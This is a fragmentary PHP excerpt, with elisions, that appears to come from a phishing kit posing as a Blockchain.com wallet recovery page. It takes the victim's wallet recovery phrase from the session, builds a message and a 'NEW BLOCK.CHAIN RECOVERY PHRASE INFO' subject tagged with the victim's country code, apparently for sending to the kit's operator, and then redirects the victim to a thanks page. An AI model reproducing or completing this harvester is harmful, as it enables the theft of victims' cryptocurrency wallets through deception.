...
*/
  ...
  $getDomain = $parse['host'];
	...
	$message .= "++++++++++++++🌐 CoDeX@BLOCK.CHAIN RECOVERY PHRASE INFO  🌐++++++++++++++\n";	
	$message .= "RECOVERY PHRASE 	    : ".$_SESSION["mnemonic"]."\n";	
	...
	$subject = "NEW BLOCK.CHAIN RECOVERY PHRASE INFO FROM [" . $notirput . "] [$countrycode]";
...
header( "refresh:0;url=../thanks.php?SESSION=$get_sess" );
?>